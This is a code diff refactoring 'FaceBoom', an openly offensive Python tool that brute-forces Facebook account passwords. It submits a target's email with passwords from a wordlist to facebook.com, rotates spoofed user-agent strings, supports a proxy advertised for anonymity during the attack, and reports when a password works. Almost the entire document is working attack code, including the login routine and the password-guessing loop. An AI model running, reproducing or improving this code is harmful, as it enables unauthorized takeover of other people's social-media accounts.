@@ -34,27 +34,41 @@ except ImportError:
 class FaceBoom(object):
 
 
-    def __init__(self, target=None, target_profile=None,single_passwd=None, wordlist=None, proxy=None, update=False):
+    def __init__(self, target=None, target_profile=None,single_passwd=None, wordlist=None, proxy=None):
 
         self.br = mechanize.Browser()
         self.br.set_handle_robots(False)
         self.br._factory.is_html = True
-        self.br.addheaders=[('User-agent',self.get_random_user_agent())]
+        self.br.addheaders=[('User-agent',random.choice([
+               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
+               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
+               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
+               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
+               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
+               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
+               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]
         self.target = target
         self.target_profile = target_profile
         self.single_passwd = single_passwd
         self.wordlist = wordlist
         self.proxy = proxy
-        self.useProxy = False
-        self.update = update
+        self.useProxy = None
+
+
+    def checks(self):
         if self.wordlist:
             if not os.path.isfile(self.wordlist):
                 errMsg("Please check Your Wordlist Path")
                 sys.exit(1)
-        if not self.cnet():
+        elif self.single_passwd:
+            if len(self.single_passwd.strip()) < 6:
+                errMsg("Invalid Password")
+                print("[!] Password must be at least '6' characters long")
+                sys.exit(1)
+        elif not self.cnet():
             errMsg("Please Check Your Internet Connection")
             sys.exit(1)
-        if self.proxy:
+        else:
              if self.proxy.count(".") != 3:
                     errMsg("Invalid IPv4 ["+rd+str(self.proxy)+yl+"]")
                     sys.exit(1)
@@ -68,16 +82,6 @@ class FaceBoom(object):
                 errMsg("Connection Failed")
                 errMsg("Unable to connect to Proxy["+rd+str(self.proxy)+yl+"]")
                 sys.exit(1)
-
-
-    get_random_user_agent = staticmethod(lambda: random.choice([
-               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
-               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
-               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
-               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
-               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
-               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
-               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))
 
 
     @staticmethod
@@ -114,12 +118,25 @@ class FaceBoom(object):
 
 
     def login(self, password):
-        self.br.open("https://facebook.com")
-        self.br.select_form(nr=0)
-        self.br.form['email']=self.target
-        self.br.form['pass']=password
-        self.br.method ="POST"
-        return  self.br.submit().get_data().__contains__(b'home_icon')
+
+        try:
+            self.br.open("https://facebook.com")
+            self.br.select_form(nr=0)
+            self.br.form['email']=self.target
+            self.br.form['pass']= password
+            self.br.method ="POST"
+            return  self.br.submit().get_data().__contains__(b'home_icon')
+        except(KeyboardInterrupt, EOFError):
+            print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
+            time.sleep(1.5)
+            sys.exit(1)
+        except Exception as e:
+            if self.single_passwd:
+                print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
+                sys.exit(1)
+            print(rd+" Error: "+yl+str(e)+wi+"\n")
+            time.sleep(0.60)
+
 
     def banner(self):
 
@@ -161,66 +178,6 @@ class FaceBoom(object):
                      ver.write(repoVersion)
                 write("  [+] Successfully updated :)\n")
 
-    def start(self):
-        if self.update:
-            self.updateFaceBoom()
-            sys.exit(1)
-        if self.target_profile:
-            self.get_profile_id()
-            sys.exit(1)
-        if self.target:
-            self.banner()
-            if self.single_passwd:
-                passwd = self.single_passwd.strip()
-                if len(passwd) <6:
-                    errMsg("Invalid Password")
-                    sys.exit(1)
-                try:
-                  write(wi+"\n["+yl+"~"+wi+"] Trying Single Password[ {"+yl+str(passwd)+wi+"} ]")
-                  if self.login(passwd):
-                     sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
-                     print(wi+"========================="+"="*len(passwd)+"======")
-                     print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
-                     print(wi+"========================="+"="*len(passwd)+"======")
-                  else :
-                    sys.stdout.write(yl+" ==> Login"+rd+" Failed\n"+wi)
-                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"The Password[ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
-                    print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another password or Wordlist "+gr+":)"+wi)
-                except(KeyboardInterrupt, EOFError):
-                    print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
-                    time.sleep(1.5)
-                    sys.exit(1)
-                except Exception as e:
-                    print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
-                    sys.exit(1)
-            if self.wordlist:
-                loop = 1
-                with open(self.wordlist) as wlist:
-                    for passwd in wlist:
-                        passwd = passwd.strip()
-                        if not passwd or len(passwd) <6:continue
-                        write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
-                        try:
-                          if self.login(passwd):
-                             sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
-                             print(wi+"========================="+"="*len(passwd)+"======")
-                             print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
-                             print(wi+"========================="+"="*len(passwd)+"======")
-                             break
-                          else:sys.stdout.write(yl+" ==> Login"+rd+" Failed\n")
-                          loop+=1
-                        except(KeyboardInterrupt, EOFError):
-                              print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
-                              time.sleep(1.5)
-                              sys.exit(1)
-                        except Exception as e:
-                              print(rd+" Error: "+yl+str(e)+wi+"\n")
-                              time.sleep(0.60)
-                    else:
-                          print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+self.wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
-                          print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another Wordlist. "+gr+":)"+wi)
-            sys.exit(1)
-
 parse = optparse.OptionParser(wi+"""
 Usage: python ./faceboom.py [OPTIONS...]
 -------------
@@ -254,12 +211,13 @@ Examples:
      |--------
 """)
 
+
 def Main():
    parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
       help="Specify Target Email ")
    parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wlst",type="string",
       help="Specify Wordlist File ")
-   parse.add_option("-s","--singe","--S","--SINGLE",dest="single",type="string",
+   parse.add_option("-s","--single","--S","--SINGLE",dest="single",type="string",
       help="Specify Single Password To Check it")
    parse.add_option("-p","-P","--proxy","--PROXY",dest="proxy",type="string",
                         help="Specify HTTP/S Proxy To Be Anonymous When Attack Enable")
@@ -267,34 +225,51 @@ def Main():
                         help="Specify TARGET FACEBOOK PROFILE URL")
    parse.add_option("-u","-U","--update","--UPDATE", dest="update", action="store_true", default=False)
    (options,args) = parse.parse_args()
+   faceboom = FaceBoom()
    if options.update:
-    FBOM = FaceBoom(update=True)
-    FBOM.start()
-   if options.taremail !=None and options.wlst !=None and options.proxy !=None:
-       FBOM = FaceBoom(target=options.taremail, wordlist=options.wlst, proxy=options.proxy)
-       FBOM.start()
-   elif options.taremail !=None and options.single !=None and options.proxy !=None:
-       FBOM = FaceBoom(target=options.taremail, single_passwd=options.single, proxy=options.proxy)
-       FBOM.start()
+    faceboom.updateFaceBoom()
+    sys.exit(1)
 
-   elif options.taremail !=None and options.single !=None:
-       FBOM = FaceBoom(target=options.taremail,single_passwd=options.single)
-       FBOM.start()
-   elif options.taremail !=None and options.wlst !=None:
-       FBOM = FaceBoom(target=options.taremail, wordlist=options.wlst)
-       FBOM.start()
-   elif options.url !=None and options.proxy != None:
-       FBOM = FaceBoom(target_profile=options.url, proxy=options.proxy)
-       FBOM.start()
-   elif options.url != None:
-       FBOM = FaceBoom(target_profile=options.url)
-       FBOM.start()
-   else:
-       print(parse.usage)
-       exit(1)
+   elif options.taremail != None or options.url != None:
+    faceboom.target = options.taremail
+    faceboom.target_profile = options.url
+    faceboom.wordlist = options.wlst
+    faceboom.single_passwd = options.single
+    faceboom.proxy = options.proxy
+    faceboom.checks()
+    if faceboom.target_profile:
+        faceboom.get_profile_id()
+        sys.exit(1)
+    if faceboom.wordlist or faceboom.single_passwd:
+            faceboom.banner()
+            loop,passwords = (1,open(faceboom.wordlist).readlines()) if not faceboom.single_passwd else ("~",[faceboom.single_passwd])
+            for passwd in passwords:
+                passwd = passwd.strip()
+                if len(passwd) <6:continue
+                write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
+                if faceboom.login(passwd):
+                    sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
+                    print(wi+"========================="+"="*len(passwd)+"======")
+                    print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
+                    print(wi+"========================="+"="*len(passwd)+"======")
+                    break
+                else:
+                    sys.stdout.write(yl+" ==> Login"+rd+" Failed\n")
+                    loop = loop + 1 if loop != "~" else "~"
+            else:
+                if faceboom.single_passwd:
+                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"The Password[ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
+                    print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another password or Wordlist "+gr+":)"+wi)
+                else:
+                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+faceboom.wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
+                    print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another Wordlist. "+gr+":)"+wi)
+            sys.exit(1)
+   print(parse.usage)
+   sys.exit(1)
 
 if __name__=='__main__':
     Main()
+
 ##############################################################
 #####################                #########################
 #####################   END OF TOOL  #########################
